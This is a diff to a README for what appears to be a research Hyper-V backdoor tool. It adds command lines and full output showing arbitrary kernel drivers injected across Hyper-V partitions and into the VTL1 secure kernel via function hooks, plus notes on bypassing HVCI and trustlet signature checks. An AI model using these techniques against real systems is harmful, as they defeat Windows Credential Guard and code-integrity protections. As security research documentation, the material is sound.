@@ -279,9 +279,48 @@ EPT PDPTE 0x145f9000[0x0]: 0x14612007
 0xfffff8017d1d5000 -> 0x00000000033d5000
 ```
 
-Also, `backdoor_client.exe` can inject dummy driver located in `payloads/DmaBackdoorHv/backdoor_driver.sys` from guest Hyper-V partition to host Hyper-V partition:
+Loading arbitrary kernel drivers into the specified hypervisor partition from any guest or host poratition:
+
+```
+> .\backdoor_client.exe 0 --ept-list
+[+] Running on CPU #0
+[+] Collecting EPT address list...
+[+] Reading collected data from 0xfffff82269800b80...
+
+  #00: VPID = 0x0001, EPT = 0x000000010143701e
+  #01: VPID = 0x0002, EPT = 0x000000010143301e
+
+> .\backdoor_client.exe 0 --vm-inject 0x000000010143701e .\driver_example.sys
+[+] Running on CPU #0
+[+] Loading 3072 bytes from .\driver_example.sys
+[+] Current CR3 value is 0x000000010f6c4001
+[+] Guest EPT is at 0x000000010143701e
+[+] Found valid PROCESSOR_START_BLOCK at 0x0000000000001000
+
+   CompletionFlag: 0x00000001
+     HalpLMStub(): 0xfffff80277599760
+     PML4 address: 0x1ad000
+
+[+] Locating kernel image in memory, it might take a while...
+[+] Kernel is at 0xfffff80277200000 (physical: 0x2c00000)
+[+] Kernel INIT section is at nt+d55000 (size: 0x17c44)
+[+] Kernel PAGEKD section is at nt+934000 (size: 0x5b92)
+[+] nt!NtReadFile() is at 0xfffff802777e7690 (physical: 0x31e7690)
+[+] Driver loader virtual address is 0xfffff80277b35000 (size: 0x5000)
+[+] Spin lock physical address is 0x592eff8
+[+] Patch size is 15 bytes
+[+] nt!NtReadFile() hook was set: 0xfffff802777e7690 -> 0xfffff80277b37d70
+[+] Waiting for the payload driver to be executed...
+[+] Payload driver was executed!
+[+] Payload driver image address is 0xffffc801321ee000
+[+] Performing cleanup...
+[+] DONE
+
+```
 
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" width="749" height="498">
+
+This functionality also can be used for [Hypervisor-Protected Code Integrity](https://docs.microsoft.com/en-us/windows-hardware/drivers/bringup/device-guard-and-credential-guard) (HVCI) bypass to load arbitrary kernel drivers.
 
 Show basic information about secure kernel running in VTL1:
 
@@ -342,6 +381,36 @@ Show list of the running VTL1 trustlets:
     ImagePolicyIdCrashDump = 0x0
     ImagePolicyIdScenarioId = 0x7ff67ad6a000
 
+```
+
+Load arbitrary secure kernel drivers into the VTL1:
+
+```
+> .\backdoor_client.exe 0 --sk-inject .\driver_example_sk.sys
+[+] Running on CPU #0
+[+] Loading 3072 bytes from .\driver_example_sk.sys
+[+] Collecting secure kernel information...
+[+] Reading collected data from 0xfffff82269800d80...
+[+] Running secure kernel detected, 121 VTL1 calls were made
+[+] Secure kernel IDT vector #0 is at 0xfffff8027e6d0100
+[+] Secure world EPT is at 0x000000010143301e
+[+] securekernel.exe is at 0xfffff8027e630000
+[+] securekernel.exe image size is 0xfe000 bytes
+[+] nlsdata section is at securekernel+e9000 (size: 0x128f2)
+[+] securekernel!SkobReferenceObjectByHandle() is at 0xfffff8027e63cf40
+[+] Driver loader virtual address is 0xfffff8027e719000 (size: 0x1a90)
+[+] Patch size is 15 bytes
+[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0xfffff8027e63cf40 -> 0xfffff8027e71a41c
+[+] Waiting for the driver loader to be executed...
+[+] Driver loader was executed!
+[+] VTL1 kernel memory was allocated at 0xffff988041ae3000
+[+] Performing cleanup...
+[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0xfffff8027e63cf40 -> 0xffff988041ae441c
+[+] Waiting for the payload driver to be executed...
+[+] Payload driver was executed!
+[+] Payload driver image address is 0xffff988041ae4a90
+[+] Performing cleanup...
+[+] Done
 ```
 
 On the example above you can see LSAIso trustlet process that belongs to the Windows Credential Guard and demo trustlet that was loaded using the Hyper-V backdoor. In order to execute the trustlet in Isolated User Mode Microsoft introduced `CREATE_SECURE_PROCESS` flag of `CreateProcess` [API function](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags). Trustlet executable must have valid Microsoft digital signature with the Windows System Component Verification (1.3.6.1.4.311.10.3.6) Enhanced Key Usage property. To bypass this requirement I made `trustlet_loader.exe` tool that utilizes Hyper-V backdoor functionality to perform in-memory patching of `skci.dll` image responsible for VTL1 code integrity used by Secure Kernel.
